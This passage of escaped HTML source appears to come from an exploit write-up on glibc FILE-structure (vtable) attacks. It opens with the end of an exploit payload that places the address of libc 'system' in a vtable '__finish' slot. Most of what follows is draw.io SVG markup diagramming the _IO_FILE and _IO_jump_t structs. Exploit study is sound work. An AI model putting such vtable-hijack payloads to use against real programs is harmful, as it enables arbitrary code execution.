&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])          &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#               vtable-&amp;gt;__finish

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;exit(payload)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;&#x2F;h2&gt;
&lt;p&gt;This diagram displays my payload (on the right) alongside the corresponding structures. The &lt;code&gt;_IO_jump_t&lt;&#x2F;code&gt; and the 
&lt;code&gt;_IO_FILE&lt;&#x2F;code&gt; structs are overlaid on each other.&lt;&#x2F;p&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;
&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version=&quot;1.1&quot; width=&quot;921px&quot; height=&quot;926px&quot; viewBox=&quot;-0.5 -0.5 921 926&quot; content=&quot;&amp;lt;mxfile host=&amp;quot;Electron&amp;quot; modified=&amp;quot;2020-03-30T08:04:12.711Z&amp;quot; agent=&amp;quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) draw.io&#x2F;12.9.3 Chrome&#x2F;80.0.3987.158 Electron&#x2F;8.2.0 Safari&#x2F;537.36&amp;quot; etag=&amp;quot;FbfnCxhehhRZRtg15uh7&amp;quot; version=&amp;quot;12.9.3&amp;quot; type=&amp;quot;device&amp;quot;&amp;gt;&amp;lt;diagram id=&amp;quot;cSOi3DqNJlmwpbJNLqXN&amp;quot; name=&amp;quot;Page-1&amp;quot;&amp;gt;7V1rk9o4Fv01XTWTqnbpYT38MXQmM6np7KaSqd2dT11uMOCJwYwx&#x2F;civXwlksC0bG7DATKurU2kLY4zOuUe6V9dXN&#x2F;hu9vJr4i+mn+NREN0gMHq5wR9uEIKux8R&#x2F;suV108Ip2TRMknCkTto1fAt&#x2F;BKoRqNZVOAqWhRPTOI7ScFFsHMbzeTBMC21+ksTPxdPGcaQ+VV1&#x2F;4U+Cwhmy4dvQj&#x2F;TW&#x2F;4ajdKq+Bcm9&#x2F;bcgnEyzT4ZAvTLzs5NVw3Lqj+LnXBP+5QbfJXGcbv6avdwFkey8sHCHH2te3d5YEszTNm+YfB5&#x2F;IstB+PTHlPw9+P3lw2D1egvVZZ78aKW+8cOnfz98&#x2F;HT&#x2F;i7rr9DXriuVzOIv8uTgajON5+k29AsWxH4WTufh7KO4lSETDU5CkoejF9+qFWTgaybMHw2kYje7913glb3qZ+sPv2dFgGifhD3FlP1KXFS8nqeIEooUzvsl3imYgWpNgKc75kvUELDV99l8KJ977y1Q1DOMo8hfL8HH7TWZ+MgnngzhN45k6abnwh+F8sm2Tp43DKLqLo1h81w&#x2F;zeN0nOh5Z34q+CF5yTQqfX4N4FqTJqzgle5V7m7coY0HE3Rw&#x2F;76gHmeLTNEc7xqHDwe4HKwNQ5J9sP2nHD&#x2F;GHosghdEEaXULxbRF4GEf+ZLnthRxrxFdPqzssI00UjNN9lFH9f78+7YO7a&#x2F;mqOkA2xeLt42htX1PxxmAu4Y5TP&#x2F;U32EogF7G42XWXkIH4Ff14BxxyQ8Rt3oljuDsWv&#x2F;L0JL2L58s08cM1pIEgznOwTDMD2BATwkrw95tbMyUyCtB2DMCuKcixBrmGcRSuARU9FX&#x2F;fymSNmRyI+h&#x2F;xQrTeQo0HWOcBrsA88h+D6Eu8DNMwltdPNueWuNAEtzF4KWgHLzeFrquhO5z6yTtp0mIcSAJ&#x2F;9LBIk7dj2GWxB0bR5y2NGznQEAGQNW+DAIvZYIbcpSwctbDwYD6yFm6IALwtAUwaObFGbhBjFzjowkZOm4380V8G1soNMYC3ZYBJK2fWyg1izIWVe7mflnM3YybP95r8cxKmgbV5k3zgR&#x2F;HBpAB4VgAMRmIQcHCPBACDFgJgfXdzdOBH0cGg&#x2F;WM9mG&#x2F;tv8NIrOThZU1eD7&#x2F;rJm+deXMM4G0ZYNLKbcTOIMYYAKflkosxK98fsXtcje283iQBeFsCmDRyG7EzibELHJZbLgeXHtf3h++kxdtR3RwZ+FFkMGn9NpJnEnAOCskygF3Y+qsjeaLlnbT+pf+0C+TdoZv3QOOCVYEOSMGPIoVBFSA2nGcQcBcBx8vhfeFlelo96c9E4NEffl8t7LzfJB&#x2F;4MXwwaP&#x2F;UOvom8abQAT2y&#x2F;+rQXmESYH0Ac2TwjiGDSeO3sXyDeBMAHZjHu2WevTHr19fyRIeshqmKAMz85HuwEYPNn28o1f6sQkCAdxQxTCqBDQWaBNyFDsoBji4rBKxBCDYPZgkZEJODcG5FwBAnvGM4YVIDbCjAJN4cOrg&#x2F;GkD1eGD2kF0YBfPYWr0hFnjHsKAbq7&#x2F;&#x2F;bfH058NX8p&#x2F;Pv6y+utGP+RP7fguze7Bmr+PYmgP1T18h6LgXMfsatHWXL&#x2F;9wLbJ2b4gG3jE0MDna2+U&#x2F;kw9dUuiQHo32+tq&#x2F;nOjH4&#x2F;HD2vbjaCQPlkFq7d8QH7xj+GDQ&#x2F;pkd9g3izQB0aA5vfFn7Z3p4x3GcG1nRJlrN5ktr8iYo4B1DAZMmry&#x2F;&#x2F;WpPvDm8XFlK8Lm3y+sKuHPKjePh9Pea&#x2F;W&#x2F;9ph3tDXPCO4YJB24dEHwKyWO&#x2F;DIlrpQ8BbrcRVrrpkqAqXgn9fES5aJRcIZo+HGOBItZug1gNkYPA4vWjmSR8Vo606bC3rpHpbVWAzYhJsGwAwiTFjrOo5rkqbNgaxHuQvLPT9tZotNpOBJ9W1b2U2YBB3Ttrinj2R0XmUt6JSi4brJIlXi32w1Y57FeFRVRhVYXWTK3xaGiJrx0PCywMicdqmzFPX6aAWZXVPtsiLOHtP7sFc79+m3kOuAzso61h9Ty0czp70Hjmh93ITfWCsK1vk6fakK92ed2VFOUqtK4P56L0s7LzrqGk6y&#x2F;wU8f2T1&#x2F;&#x2F;JQckRvFHHf6pBan3w4aVw9KqODgcmGGmVo5u6Hzd2P6no&#x2F;awtCSI&#x2F;DZ+KH1oFgfqEL&#x2F;Fm+VCRx0XZ4JdVsEEOKDz4hoqXXMarZBioq+yArbqwm6uDwWhxtGjgjnAsJ0GqfcqaPts+OoFRLUaJtoyyhCrgzs3QqXTZS&#x2F;OnxXxtP39ewnRDH0bU4ZY+4u8de+TB2yEPRMw5DOi2&#x2F;NGv3MRM0xRq4c23ohC0&#x2F;NmhzIDGnlw5JoaPJE&#x2F;pspemjh4lOFJ9LHW6E5qecEPPCYYaOVSIKMeI9oHfdYy+NsYjwzj+Ko2XKh5&#x2F;oA9zNEe2QXqHIj2Yg6q8F1DPkNMcPz1ZXzfPfywCBDvw4gjoKZP47SDgkR7YANIQcN8OAhDzyxsBbvFwSBZ&#x2F;umi8Mz9Vo54HGHMRcNuWUXWBAykGwBPSwzyCDPVmm&#x2F;1uRGfOR8FIMfJ5GqbBt4U&#x2F;lK8+J&#x2F;6iSPWhXCUP55Ll6+NOQoCNGGxIUYvBbdvH3c&#x2F;V66yFk7QlcS4NAJyL1LBGCbK1JQQdwKHrcUghIKBlCTnXdQjCjHFIACPE1FoJZLojAV44cB+BL+4K&#x2F;LR+ssifBTdogNHPdQL+j8sj0BJKxPFHfxZGEtU74QeE66eu&#x2F;xU8n2SMit2HB95lnToOPIgZQJ7HCeog5aDmDu0ThkYQzspLUQe4WM4XkEs5xrhtxUHH5YBQ8VYKGPSIsYePuO7LXHYS0aS3xHM49IDw5IVyQtgyje9cest1x2Sjt8jnUm+V1rI3qrXIoNZyUE2c&#x2F;mgt130mq7UdIHw1Wlu1yk39mdTW5esyDWZvUhRcg6LQMJjISErLSi9iBDGWHOYekJRzlkG4wYuEDkViDGYeYphClNUw68kgXFFDG7x8FD8fxD9rYd1amHtkatHZRt2KGtt20D0d3ysZc0mLcnp9UlYOHMgZJBBhQIjXtgzZmZQ1CwPmenMuLrScWlXtVlVJTWZ2b1SV2Bq1JvC9FlVtkZ7SJ1WFFDgIIMqEonKG25Z5PZeq6iHY9+LHamrHmsp7rqkVxWCtpp6O75VoapvCz33SVASEpkLRpVz4&#x2F;0Ihab9EtaKuuhXV7kWV9n2iajdTMILvtYjqlQVWpV0gyIW2UkA9AGG&#x2F;IqsVJcmtqBoQ1b7HVCtqF1pRPR3faxHVQ1L2+iCqXIgqIh5FHgEep&#x2F;1K0auo+m011YCm9j0Tz5b6N4LvlWjqQWnQPdBULCOqLnQ5o9iDhPVLUyuynq2mdq+pvc9utsnNRvC9Ek3tXWpzg6a6MqLqeuLX4xi5uF8B1YrMZqup3Wtq77OYbRKzEXyvRVMPqHnWC02VAVXCAEQYMYx4v+apFQnhVlMNaGpz2ZELa6rd6tMEvteiqQeUhu2Fpsp4KnUZcymDrnwQr1+iqodSrKgaENUji9ueT1RbJClaUT0Y32sR1b4VR2kQVYKEqDJEhFlA4npevyaqnh5KsZpqQFNrONIbTfVaJClaTT0Y3yvRVK9F6KdXmioXqbg0CUxEr&#x2F;RrmurpkRQrqd1L6oazfZZUuwOgCXyvRVIP2MykD5JK5RoV54CKXsOU9cz19&#x2F;RIitVUA5p65M4s59NUu4+aCXyvRVOv7OlUKteoRHcI+3AZIz3z&#x2F;O3DqWeR1L4&#x2F;nAqBfTrVBMBXoqkQXNnCP+XAwQATLvNTuQv7NVGFwK78n6X+G+j70j8Edu3fCMLXIqzZ0kp+Z5&#x2F;RJMj2dhedNo0n8dyPftm1DoqF6Hfn3MdrOCWafwVp+qpMTO6UcNO8tZSTbVRWvUNQbsOheLEWCNHyMZTfd7tLe60Na1Vgu9tVKNsHYbN&#x2F;z76+5jVPM3e8JxXbXzy&#x2F;Zn8g0bf+a+40ZUG1n4pA6VNVtnvdFlfa+S7Ye37FtyqxfXPHO+53sLkRyrA8rzU0MLvjvbHMsJCRIl4oy39v4J1+ofK+z+UL1WyU1RkHqvx3GmXTBvHK2Fd2Tv9exbK9qDbb5gKRskZ5jdvNvjFivgWgu3hZn7p7E53I&#x2F;zelusFPqn43BT9ndyG+1eZGNifWTdoqtr1pGpQP3&#x2F;SmPI86ci+R&#x2F;TuBa4zIpCE&#x2F;ilbt3GZu7xt2GZ1I1Z6wN&#x2F;kdYXcbxNbsCXvSyDnyl9P1Te&#x2F;d5KhZcIoD5OTz+BNZDsKnP6bk78HvLx8Gq9fbrNzERin2dX9NhPAwCTt0xCOoSEOsdt6rE7KG882MYO4Fo4&#x2F;7rZiUrBgj4ACAPTFPwYQQ4LWbGUsXGRKIPQpcj3t0D8qnFcWuyOBaa+9jWKe41k0+ssjvCdFHJua5EJPNryEqEBt7NAFvzkXGVAgK5cLXBbSlDggPmXEP7n5NgX&#x2F;BJfLDBFU+wNljQSUVzxnggY06dl9p9IT18bPIqV0eNwHvdcgp07HuQYSldezQzbthW59MuWG82RETR1+CJBR9ud6YMwtyyqvdCvWGtBgQ5d7+kKg4KF+uMxetGj5DwSOvOJRRhB2c+ylJUeNW6TUxKXlZRAHKWF5aX+soMloOV1C1NbFRv49VpcZv4kWj8KkyEiWH2VslnjIUlQmZjHC1DFJlHyFkc14f7Rory5KX2u44pU4Ybo1tvg6dFV487GbGi1y8TGKwDZdtbq+Ht&#x2F;xzw02K5jV6bzXSRyFyUEVGEj5nsI9dMPfgMA+AFj2AAyq4nMMBYHrSwTa4faM2p3yb+1IadAbYCRkI53AGmM0&#x2F;MAHvlTgD9DLOgJq&#x2F;yxk32M7Z&#x2F;1QtmB41i+&#x2F;SwzA8h1c63NdlFm3Svj9RoHx+tl5sdLoNs63R3lDejGTmGVcD66TtRFeTZNU5s82ZQHni2JEbiEsJLNsPqiNy+Q1eE&#x2F;HpaeeXb8iQpWSFMN7AWnneWuB5rQVmKYKNqt5RGtqh5gC9MvvUHdcmgJXfkE1VWvP74DcAUshhO9kgqpGqeEDo4dO&#x2F;H&#x2F;5azRYPqWYry+dwFvlruqzppV7JO&#x2F;vNDtBwGkaje&#x2F;81XklmLFN&#x2F;+D07GkzjJPwhruxnpiNeTjIaI1o445t8p7KEdQgh+JJxFZaaPvsvhRPvfTnVXTcM4yjyF8vwcftNZoK04XwQp2k8yxla3pZqzafCWrSZdK0HjbMaeJmGsooEXVoxRd7upr5n5Pkqvfv5JApyn1ciNc6yInOf51UFN0p7f&#x2F;uRQHzup8FACuVSm4l3wlM9A+IpDkfvRNPDw2g1m71qZG121lv6Zb1y1XWeNRh2M&#x2F;1ei7A2sQ1jpwMHvPKukX2yyijExHNaSkoHXnYNwvraQMmQdcStJR8GM2VtYe7GlquXhq0lt4ul7UO9FmJYtXGvIUOu3mRkjxmPw3l41Ebo12vGZjCuCJGe2YqxLcljFGIXnXFErkZYX1F0HMca76nIEtCDQRhmaSXXEBo+LkhWiGt1+lymvPIXP5XO7frycu5qej1EDastAmc1GycaXg9xiyEKMUSxPEkrItzlsFbxDYeGtcRhEsu0ld3pib+Yfo5HgTzj&#x2F;w==&amp;lt;&#x2F;diagram&amp;gt;&amp;lt;&#x2F;mxfile&amp;gt;&quot;&gt;&lt;defs&gt;&lt;clipPath id=&quot;mx-clip-183-26-162-34-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;26&quot; width=&quot;162&quot; height=&quot;34&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-68-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;68&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-108-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;108&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-148-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;148&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-188-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;188&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-228-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;228&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-268-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;268&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-309-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;309&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-349-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;349&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-389-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;389&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-429-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;429&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-469-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;469&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-509-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;509&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-549-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;549&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-589-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;589&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-629-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;629&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-670-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;670&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-710-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;710&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-183-750-162-32-0&quot;&gt;&lt;rect x=&quot;183&quot; y=&quot;750&quot; width=&quot;162&quot; height=&quot;32&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-4-26-152-751-0&quot;&gt;&lt;rect x=&quot;4&quot; y=&quot;26&quot; width=&quot;152&quot; height=&quot;751&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-4-785-152-36-0&quot;&gt;&lt;rect x=&quot;4&quot; y=&quot;785&quot; width=&quot;152&quot; height=&quot;36&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-746-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;746&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-785-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;785&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-820-162-44-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;820&quot; width=&quot;162&quot; height=&quot;44&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-27-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;27&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-106-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;106&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-186-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;186&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-226-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;226&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-266-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;266&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-306-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;306&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-386-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;386&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-426-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;426&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-466-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;466&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-506-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;506&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-546-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;546&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-586-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;586&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-626-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;626&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-666-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;666&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-706-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;706&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-66-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;66&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-146-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;146&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-574-346-162-41-0&quot;&gt;&lt;rect x=&quot;574&quot; y=&quot;346&quot; width=&quot;162&quot; height=&quot;41&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-378-747-152-34-0&quot;&gt;&lt;rect x=&quot;378&quot; y=&quot;747&quot; width=&quot;152&quot; height=&quot;34&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-378-788-152-34-0&quot;&gt;&lt;rect x=&quot;378&quot; y=&quot;788&quot; width=&quot;152&quot; height=&quot;34&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-378-830-152-34-0&quot;&gt;&lt;rect x=&quot;378&quot; y=&quot;830&quot; width=&quot;152&quot; height=&quot;34&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;clipPath id=&quot;mx-clip-378-871-152-34-0&quot;&gt;&lt;rect x=&quot;378&quot; y=&quot;871&quot; width=&quot;152&quot; height=&quot;34&quot;&#x2F;&gt;&lt;&#x2F;clipPath&gt;&lt;&#x2F;defs&gt;&lt;g&gt;&lt;path d=&quot;M 179 26 L 179 0 L 349 0 L 349 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 179 26 L 179 781.8 L 349 781.8 L 349 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 179 26 L 349 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-weight=&quot;bold&quot; text-anchor=&quot;middle&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;263.5&quot; y=&quot;17&quot;&gt;_IO_FILE&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-26-162-34-0)&quot; font-size=&quot;10.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;47&quot;&gt;int _flags;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 64 L 349 64&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-68-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;88.55&quot;&gt;char* _IO_read_ptr;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 104.1 L 349 104.1&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-108-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;128.65&quot;&gt;char* _IO_read_end;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 144.2 L 349 144.2&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-148-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;168.75&quot;&gt;char* _IO_read_base;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 184.3 L 349 184.3&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-188-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;208.85&quot;&gt;char* _IO_write_base;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 224.4 L 349 224.4&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-228-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;248.95&quot;&gt;char* _IO_write_ptr;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 264.5 L 349 264.5&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-268-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;289.05&quot;&gt;char* _IO_write_end;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 304.6 L 349 304.6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-183-309-162-32-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;184.5&quot; y=&quot;329.15&quot;&gt;char* _IO_buf_base;&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 179 344.7 L 349 344.7&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; 